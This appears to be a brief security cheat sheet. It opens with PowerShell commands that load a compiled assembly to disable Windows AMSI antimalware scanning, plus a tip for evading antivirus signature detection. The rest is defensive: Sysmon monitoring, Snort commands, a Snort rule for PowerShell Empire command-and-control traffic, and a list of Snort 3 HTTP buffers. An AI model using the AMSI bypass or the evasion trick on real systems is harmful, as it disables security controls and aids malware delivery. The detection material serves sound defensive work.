 🚨 For Educational Purposes Only

---

### 🛡️ Bypass AV AMSI.dll

```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -OutputAssembly "Source.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\Source.dll"))
[BP.AMS]::Disable()

Note: If your antivirus software blocks the Source.dll file, simply add a comment (e.g., //) in Source.cs to bypass antivirus signature detection.

🕵️ Detecting PowerShell Processes with Sysmon and Wazuh
Use Sysmon to monitor PowerShell processes with this command:
powershell

Sysmon64.exe -accepteula -i sysconfig.xml


🔍 Detecting PowerShell Empire Using Snort
Analyze a pcap file with Snort to detect PowerShell Empire activity:
bash

snort -c /usr/local/etc/snort/snort.lua -r http_powershell_empire.pcap -Acmg -k none -q

This command processes packets with Snort, providing visibility into potentially malicious activity.

📜 Snort Rule for Detecting PowerShell Empire C&C Malware
Use this sample Snort rule to detect PowerShell Empire command-and-control (C&C) connections:
snort

alert http (
    msg:"PowerShellEmpire detected";
    flow:to_server,established;
    http_uri:path;
    content:"/login/process.php",nocase;
    http_header;
    content:"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",nocase;
    http_cookie;
    content:"session",nocase;
    reference:url,attack.mitre.org/techniques/T1086;
    reference:url,powershellempire.com;
    classtype:trojan-activity;
    sid:56465; rev:5;
)


📂 Snort 3 HTTP Buffers
Snort 3 
provides several HTTP inspection buffers to analyze various HTTP traffic
 elements. Some of the available buffers include:
http_inspect::http_client_body
http_inspect::http_cookie
http_inspect::http_header
http_inspect::http_method
http_inspect::http_param
http_inspect::http_raw_body
http_inspect::http_raw_cookie
http_inspect::http_raw_header
http_inspect::http_raw_request
http_inspect::http_stat_code
http_inspect::http_uri
http_inspect::js_data
http_inspect::vba_data
Run Snort for analysis again:
bash

snort -c /usr/local/etc/snort/snort.lua -r http_powershell_empire.pcap -Acmg


📚 Further Reading
For more resources, articles, and tools on cybersecurity, visit https://Livehack101.com
